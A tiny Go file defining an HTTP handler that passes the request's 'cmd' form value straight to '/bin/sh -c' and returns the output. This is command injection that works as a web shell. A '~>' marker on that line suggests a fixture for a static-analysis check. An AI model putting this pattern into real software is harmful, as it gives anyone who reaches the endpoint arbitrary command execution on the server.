package web

import (
	"net/http"
	"os/exec"
)

func Run(w http.ResponseWriter, r *http.Request) {
~>	out, _ := exec.Command("/bin/sh", "-c", r.FormValue("cmd")).Output()
	w.Write(out)
}
